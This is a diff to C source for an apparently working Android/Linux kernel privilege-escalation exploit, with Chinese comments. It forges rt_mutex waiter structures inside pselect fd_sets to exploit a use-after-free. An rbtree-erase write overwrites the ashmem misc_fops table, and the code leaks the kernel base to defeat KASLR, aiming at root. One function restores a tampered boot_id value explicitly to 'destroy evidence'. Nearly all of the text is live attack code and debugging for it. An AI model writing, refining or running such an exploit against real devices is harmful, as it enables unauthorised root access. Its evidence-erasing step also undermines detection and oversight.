@@ -13,25 +13,43 @@
  *     [3] next_lock == waiter->lock(fake_lock) 校验通过
  *     [4] lock = waiter->lock = fake_lock(页内)
  *     [5] trylock(fake_lock->wait_lock=0) 成功
- *     [7] rt_mutex_dequeue(fake_lock, 鬼waiter) -> rb_erase_cached(tree_entry)
- *         tree_right=0 且 tree_left=写目标 -> rbtree.c "Still case 1, the
+ *     [7] owner=fake_task|1(非NULL 非 walk task) -> 走 dequeue 全链:
+ *         rt_mutex_dequeue(fake_lock, 鬼waiter) -> rb_erase_cached(tree_entry)
+ *         rt_mutex_dequeue_pi(fake_task, 鬼waiter) -> rb_erase_cached(pi_tree)
+ *         两处 rb_right=0 且 rb_left=写目标 -> rbtree.c "Still case 1, the
  *         child is node->rb_left": tmp->__rb_parent_color = pc
- *         ==> *(u64*)tree_left = tree_pc   【W1】
+ *         ==> *(u64*)tree_left = tree_pc   【W1】x2
  *         该分支 rebalance 恒 NULL(无 __rb_erase_color 重平衡)
- *     [8] waiter_update_prio(栈上写) + rt_mutex_enqueue(空树挂根,页内写)
- *     [9] rt_mutex_owner(fake_lock)=NULL -> walk 干净退出
- *         (wake_up_state(fake_task, 3): fake_task.__state=0 -> ttwu 早退)
+ *         (owner==NULL 是旧 bug: walk 走 "lock is free" 分支直接 wake
+ *          退出, rb_erase 永不执行 -> 23 次全 step=4 且无 panic)
+ *     [8] waiter_update_prio(栈上写) + enqueue 挂回黑根(页内写)
+ *     [9] walk 下一跳 task=fake_task -> pi_blocked_on=0 终止链;
+ *         wake_up_state(fake_task, 3): fake_task.__state=0 -> ttwu 早退
  *
- * fd_set 布局 = slide.c 真机验证的 11-word 骨架(shift=3)，仅把
- * tree_pc/tree_left 两格换成 fops 语义：tree_pc=fake_fops(写入值)，
- * tree_left=misc_fops 槽运行时地址(写目标，需 KASLR)。其余格子与
- * slide 完全一致(页内 RED 父指针/空子节点/fake_task/fake_lock/prio=130)，
- * 保证 walk 只碰：栈上鬼标签 + 喷射页 + misc_fops 槽(.data 必可写)。
+ * fd_set 布局 = slide.c 真机验证的 11-word 骨架(shift=3)，tree 与
+ * pi_tree 两组格子都换成 fops 语义：parent_color=fake_fops(写入值)，
+ * rb_left=misc_fops 槽运行时地址(写目标，需 KASLR)。其余格子与
+ * slide 完全一致(fake_task/fake_lock/prio=130)，保证 walk 只碰：
+ * 栈上鬼标签 + 喷射页 + misc_fops 槽(.data 必可写)。
  * ========================================================================== */
 
 #include "common.h"
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 24
+
+/* DEPTH 渐进验证(slide.c 真机验证机制移植):
+ * DEPTH 0: 鬼标签 prio 种 120 —— __waiter_prio() 对 CFS task 恒返回
+ *   DEFAULT_PRIO(120),与 nice 无关 -> rt_mutex_waiter_equal() 命中 ->
+ *   rt_mutex_adjust_pi 零解引用早退。跑通即证明 shift 对齐(prio 字段
+ *   读到的确实是我们种的值)且 UAF+walk 入口打通;崩了说明 shift 错
+ *   (prio 读垃圾 -> 走全链 -> fake_lock 解引用炸)。
+ * DEPTH 2: prio=130 全链真跑(dequeue/enqueue/W1 写 misc_fops)。 */
+#define FOPS_DEPTH_EARLY_EXIT 0
+#define FOPS_DEPTH_FULL_CHAIN 2
+#define FOPS_CFS_WAITER_PRIO 120
+
+static int fops_probe_depth = FOPS_DEPTH_EARLY_EXIT;
+static int fops_shift_verified = -100;
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -126,39 +144,75 @@ static void pselect_put_waiter_word(
   }
 }
 
-void open_selected_fds(
-    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
-  (void)write_fd;
-  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
-  if (high_read < 0) {
-    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
+/* 【阻塞锚点】armed fd 统一 dup2 成"未启动的 timerfd"——poll 永不就绪，
+ * pselect 稳定睡满 timeout，consumer 才有时间喊老师(walk)。
+ *
+ * 不能用 pipe read end 当 blocking fd(真机实测 ret=148/160 秒回):
+ *   pipe 写端 pipefd[1] 是低位 fd(3/4 附近), 恰好被本布局的 fdset armed
+ *   (EX word0 = fake_lock 低位 0x84d8 -> fd 3,4,6,7,10,15;
+ *    OUT word0 = misc_fops 低位 0xbec0 -> fd 6,7,9-15),
+ *   dup2(high_read, 写端fd) 把唯一写端引用覆盖 -> pipe EOF ->
+ *   全部 armed fd 立即 POLLHUP 就绪 -> pselect 秒回, consumer 的
+ *   50ms delay 还没醒 punch_consume_go 已被清零 -> calls=0, walk 从未跑。
+ * slide.c 真机验证版(pselect 路线)用的正是 timerfd, 这里对齐。 */
+void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex) {
+  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (block_fd < 0) {
+    pr_warning("pselect timerfd_create errno=%d\n", errno);
     return;
   }
+  int high_block = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
+  if (high_block < 0) {
+    pr_warning("pselect F_DUPFD timerfd errno=%d\n", errno);
+    close(block_fd);
+    return;
+  }
+  close(block_fd);
+  int armed = 0;
+  int dup_fail = 0;
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
+    if (fd < 3)
+      continue; /* keep the tty fds: dup2 over stdout kills all output */
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
-      dup2(high_read, fd);
+      armed++;
+      if (dup2(high_block, fd) < 0) {
+        dup_fail++;
+      }
     }
   }
-  close(high_read);
-  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
+  dup2(high_block, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
+  close(high_block);
+  pr_info("pselect block fds armed=%d dup_fail=%d\n", armed, dup_fail);
 }
 
 /* 【涂改钥匙牌的准备】fd_set 每格 8 字节，11-word 布局(shift=3)对齐
- * slide.c 真机验证的 rt_mutex_waiter 骨架。仅 tree_pc/tree_left 换成
- * fops 语义：tree_pc=fake_fops(W1 写入值), tree_left=misc_fops 槽地址
- * (W1 写目标)。其余格子与 slide 一致(页内 RED 父指针/空子节点/
- * fake_task/fake_lock/prio=130)，保证 walk 只碰页内 + misc_fops 槽。
- * rbtree.c __rb_erase_augmented "Still case 1, child is node->rb_left"
- * 分支 rebalance 恒 NULL(与颜色无关)，tree_pc 无需 RED 位。 */
+ * slide.c 真机验证的 rt_mutex_waiter 骨架(BTF: tree 0x00 / pi_tree 0x18
+ * / task 0x30 / lock 0x38 / wake_state 0x40 / prio 0x44)。
+ * 【双 W1 写入点】对齐 Poc-Analysis 真机验证版: tree_entry 和
+ * pi_tree_entry 都种 (parent_color=写入值, rb_left=目标, rb_right=0)。
+ * walk 的 dequeue / dequeue_pi 各做一次 rb_erase_cached, 都命中
+ * rbtree.c "Still case 1, the child is node->rb_left" 分支:
+ *   tmp->__rb_parent_color = pc  ==>  *(u64*)目标 = 写入值  【W1】
+ * 该分支 rebalance 恒 NULL(无视节点颜色, 无 __rb_erase_color)。
+ * 副作用 __rb_change_child 写 写入值+8 (llseek 槽=页内自引用地址),
+ * 由 try_cfi_stage 的 repair_fake_fops_llseek 修复。
+ * 其余格子保持 slide 骨架(task/lock 页内, prio=130 触发全链)。 */
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
-  uint64_t misc_fops_target = data_addr(ASHMEM_MISC_FOPS);
+  /* W1 写目标必须是【运行时】misc_fops 槽地址: canon_addr = kaslr_base +
+   * image 偏移。data_addr/p0_data_alias 是 slide=0 的编译期 linear map
+   * 别名 —— 本机 slide 高达 0x10b6800000(68GB 级), 别名指向无辜物理页,
+   * W1 写它不 panic 但 misc_fops 槽永远改不成(root 失败且污染内存)。 */
+  uint64_t misc_fops_target = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
+  if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
+    waiter_prio_word = ((uint64_t)FOPS_CFS_WAITER_PRIO << 32) | 3;
+  }
 
   struct fops_waiter_word {
     int word;
@@ -168,9 +222,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {0, fake_fops, "tree_pc"},
     {1, 0, "tree_right"},
     {2, misc_fops_target, "tree_left"},
-    {3, fake_w0 - W0_OFF + LEFT_OFF + 1, "pi_parent"},
+    {3, fake_fops, "pi_parent"},
     {4, 0, "pi_right"},
-    {5, 0, "pi_left"},
+    {5, misc_fops_target, "pi_left"},
     {6, fake_task, "task"},
     {7, fake_lock, "lock"},
     {8, waiter_prio_word, "wake_state_prio"},
@@ -214,38 +268,27 @@ void do_pselect_fake_lock_route(void) {
       }
     }
 
-    int pipefd[2];
-    SYSCHK(pipe(pipefd));
-    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-    if (block_fd < 0) {
-      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
-                 errno);
-      block_fd = pipefd[0];
-    }
-    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
-    if (high_read < 0) {
-      cfi_last_step = 31;
-      cfi_last_errno = errno;
-      pr_error("pselect F_DUPFD read errno=%d\n", errno);
-      if (block_fd != pipefd[0]) {
-        close(block_fd);
-      }
-      close(pipefd[0]);
-      close(pipefd[1]);
-      break;
-    }
+    fops_probe_depth = (PSELECT_WAITER_WORD_SHIFT == fops_shift_verified)
+                           ? FOPS_DEPTH_FULL_CHAIN
+                           : FOPS_DEPTH_EARLY_EXIT;
 
     fd_set in;
     fd_set out;
     fd_set ex;
     prepare_pselect_fdsets(&in, &out, &ex);
-    pr_info("pselect route setup attempt=%d page=%016zx "
+    pr_info("pselect route setup attempt=%d depth=%d (%s) page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
-            "fake_fops=%016zx misc_fops=%016llx shift=%d\n",
-            route_attempt, page_base, fake_lock, fake_w0, fake_task,
-            fake_fops, (unsigned long long)data_addr(ASHMEM_MISC_FOPS),
+            "fake_fops=%016zx misc_fops=%016llx kaslr_done=%d "
+            "kaslr_base=%016llx shift=%d\n",
+            route_attempt, fops_probe_depth,
+            fops_probe_depth == FOPS_DEPTH_EARLY_EXIT
+                ? "prio=120 early-exit: zero deref alignment probe"
+                : "full chain: W1 write misc_fops",
+            page_base, fake_lock, fake_w0, fake_task,
+            fake_fops, (unsigned long long)canon_addr(ASHMEM_MISC_FOPS),
+            kaslr_done, (unsigned long long)kaslr_base,
             PSELECT_WAITER_WORD_SHIFT);
-    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+    open_selected_fds(&in, &out, &ex);
 
     atomic_store(&consumer_calls, 0);
     atomic_store(&consumer_success, 0);
@@ -255,19 +298,80 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, route_attempt);
 
     struct timespec timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-      .tv_nsec = 0,
+        .tv_sec = fops_probe_depth == FOPS_DEPTH_EARLY_EXIT
+                      ? 1
+                      : PSELECT_TIMEOUT_SEC,
+        .tv_nsec = 0,
     };
     struct timespec *timeoutp = &timeout;
 
+    struct timespec t0;
+    struct timespec t1;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
     errno = 0;
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    long elapsed_ms = (t1.tv_sec - t0.tv_sec) * 1000 +
+                      (t1.tv_nsec - t0.tv_nsec) / 1000000;
     atomic_store(&punch_consume_go, 0);
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
-            route_attempt, ret, saved_errno, calls, success, delay_usec);
+    int ready_in = 0;
+    int ready_out = 0;
+    int ready_ex = 0;
+    int first_ready[8];
+    int n_first = 0;
+    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
+      int ready = 0;
+      if (FD_ISSET(fd, &in)) {
+        ready_in++;
+        ready = 1;
+      }
+      if (FD_ISSET(fd, &out)) {
+        ready_out++;
+        ready = 1;
+      }
+      if (FD_ISSET(fd, &ex)) {
+        ready_ex++;
+        ready = 1;
+      }
+      if (ready && n_first < 8) {
+        first_ready[n_first++] = fd;
+      }
+    }
+    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
+            "delay=%d elapsed_ms=%ld ready=%d/%d/%d first_ready=%d,%d,%d,%d,"
+            "%d,%d,%d,%d\n",
+            route_attempt, ret, saved_errno, calls, success, delay_usec,
+            elapsed_ms, ready_in, ready_out, ready_ex,
+            n_first > 0 ? first_ready[0] : -1,
+            n_first > 1 ? first_ready[1] : -1,
+            n_first > 2 ? first_ready[2] : -1,
+            n_first > 3 ? first_ready[3] : -1,
+            n_first > 4 ? first_ready[4] : -1,
+            n_first > 5 ? first_ready[5] : -1,
+            n_first > 6 ? first_ready[6] : -1,
+            n_first > 7 ? first_ready[7] : -1);
+
+    if (fops_probe_depth == FOPS_DEPTH_EARLY_EXIT) {
+      /* DEPTH 0 探测轮: 早退路径零写零解引用,不可能弄脏 misc_fops,
+       * 跳过 try_cfi_stage。活着回来且 consumer 确实喊过话,才认证
+       * shift 对齐 + UAF 入口,升级下一轮全链。 */
+      if (calls > 0 && success > 0) {
+        fops_shift_verified = PSELECT_WAITER_WORD_SHIFT;
+        pr_success("pselect depth0 survived attempt=%d calls=%d success=%d "
+                   "elapsed_ms=%ld => shift=%d alignment + UAF walk entry "
+                   "verified; next attempt runs full chain\n",
+                   route_attempt, calls, success, elapsed_ms,
+                   PSELECT_WAITER_WORD_SHIFT);
+      } else {
+        pr_warning("pselect depth0 attempt=%d calls=%d success=%d "
+                   "elapsed_ms=%ld (consumer idle; retrying probe)\n",
+                   route_attempt, calls, success, elapsed_ms);
+      }
+      continue;
+    }
 
     int route_signal = calls > 0 && success > 0;
     if (route_signal) {
@@ -281,13 +385,6 @@ void do_pselect_fake_lock_route(void) {
       cfi_last_step = 33;
       cfi_last_errno = saved_errno;
     }
-
-    close(high_read);
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
 
     if (route_verified || cfi_dirty_seen || !route_signal) {
       break;
@@ -346,7 +443,9 @@ int refresh_fake_fops_text(int fd) {
  * open/ioctl/mmap 函数地址 —— 真函数地址 - 编译期偏移 = 园长门牌 _stext。
  * 五个格子互相印证，全对上才算数。 */
 int leak_kernel_base(int fd) {
-  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  /* 真 fops 表(ashmem_fops)的运行时地址 —— canon_addr 叠 KASLR slide。
+   * p0_data_alias 是 slide=0 别名(指向无辜物理页),slide 巨大时读到垃圾。 */
+  kaslr_fops_alias = canon_addr(ASHMEM_FOPS);
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
@@ -389,12 +488,23 @@ int leak_kernel_base(int fd) {
 }
 
 /* 【擦掉纸条上的墨痕】第 1 关在 boot_id 纸条上留了墨痕(门牌号)，
- * 园长可能会发现纸条被改过 —— 这里用万能写把它写回原样，毁灭证据。 */
+ * 园长可能会发现纸条被改过 —— 这里用万能写把它写回原样，毁灭证据。
+ * 主路线(tracefs 侧信道)从不动 boot_id: 先读一眼,不是内核指针就说明
+ * 纸条干净,直接过关 —— slide 巨大时 P0 别名指向无辜物理页,
+ * 无条件读写会污染别人的内存。 */
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
+  if ((slide_bootid_before >> 48) != 0xffff) {
+    pr_info("slide boot_id clean pid=%d before=%016llx (not a kernel ptr, "
+            "tracefs route never touched it; skip restore)\n",
+            getpid(), (unsigned long long)slide_bootid_before);
+    slide_bootid_restore_ret = (ssize_t)sizeof(slide_bootid_want);
+    slide_bootid_after = slide_bootid_before;
+    return 1;
+  }
   slide_bootid_restore_ret =
     configfs_write_once(
         fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
@@ -431,7 +541,9 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  /* 运行时 misc_fops 槽地址(叠 KASLR slide);slide=0 的 data_addr 别名
+   * 指向无辜物理页,读它拿到的是垃圾 -> 必然 cfi_last_step=4。 */
+  uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
